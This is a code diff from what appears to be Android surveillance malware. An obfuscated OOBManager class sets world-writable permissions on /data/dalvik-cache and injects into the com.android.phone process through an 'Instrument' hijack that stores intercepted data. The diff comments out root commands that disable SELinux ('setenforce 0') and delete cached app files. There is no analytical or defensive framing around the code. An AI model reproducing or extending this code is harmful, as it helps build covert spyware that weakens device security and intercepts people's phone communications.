@@ -135,9 +135,8 @@ public class OOBManager implements Runnable{
 	public static boolean startInjection() {
 		createMsgStorage();
 		Execute.chmod(M.e("777"), M.e("/data/dalvik-cache/"));
-		Execute.executeRoot(M.e("setenforce 0") );
-
-		Execute.executeRoot(M.e("rm /data/dalvik-cache/") + Status.getApkName().replace("/", "@") + "*");
+		//Execute.executeRoot(M.e("setenforce 0") );
+		//Execute.executeRoot(M.e("rm /data/dalvik-cache/") + Status.getApkName().replace("/", "@") + "*");
 		if(hijack==null) {
 			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), M.e("irp"), Status.self().semaphoreMediaserver, M.e("pa.data"));
 			hijack.setInstrumentationSuccessDir(messageStorage);
